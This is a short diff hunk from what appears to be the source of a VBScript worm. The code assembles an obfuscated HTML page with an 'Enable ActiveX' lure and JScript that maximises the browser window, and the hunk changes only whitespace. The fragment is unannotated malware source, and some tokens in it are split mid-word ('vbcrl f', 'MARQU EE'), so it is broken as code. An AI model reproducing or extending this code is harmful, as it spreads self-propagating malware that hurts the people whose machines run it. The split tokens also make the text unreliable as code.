@@ -221,7 +221,7 @@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
 Enable ActiveX<?-?p>"&vbcrlf& _
 "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@
 BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQU EE> "&vbcrlf& _
- "<?-?BODY><?-?HTML>"&vbcrlf& _
+"<?-?BODY><?-?HTML>"&vbcrlf& _
 "<SCRIPT language=@-@JScript@-@>"&vbcrlf& _ "<!--?-??-?"&vbcrlf& _
 "if (window.screen){var wi=screen.availWidth;var
 hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrl f& _
